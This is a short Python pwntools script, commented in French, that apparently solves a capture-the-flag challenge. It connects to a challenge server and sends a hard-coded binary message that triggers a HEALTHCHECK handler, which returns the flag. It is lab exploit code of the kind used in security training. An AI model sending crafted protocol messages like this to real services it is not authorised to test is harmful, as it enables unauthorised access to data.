import sys
from pwn import *
import struct

# ===================================
# Quel serveur cible ?
# ===================================
# Par défaut on appelle l'instance "locale", sauf si on utilise -REMOTE dans les arguments de lancement
if '-REMOTE' in sys.argv:
    host, port = 'aegissecureforgeserver.chall.malicecyber.com', '2429'
    #host, port = "46.30.202.223", "2429"
else:
    host, port = 'localhost', '2429'

# On peut activer le niveau debug, en rajoutant DEBUG dans les arguments de lancement
#context.log_level = 'debug'


# ===================================
# Ouverture connexion
# ===================================
p = remote(host,port)


# Lecture de la réponse su serveur, composée : 
# - de 4 octets indiquant la taille du message
# - suivi du message
def read_response():
    response_length = p.recvn(4)
    response_length = struct.unpack('I', response_length)[0]
    response_msg = p.recv(response_length)
    return response_msg

# Envoi du message permettant l'appel du HEALTHCHECK
def recup_flag():
    request_msg =  b'\x4c\x04\x63\x01\x00\x0d\x0a\x2a'
    p.send(request_msg)

    flag = read_response().decode()
    print(f'{flag=}')


# ===================================
# Récupération du flag, via appel de HEALTHCHECK
# ===================================
recup_flag()

# ===================================
# Fermeture connexion
# ===================================
p.close()
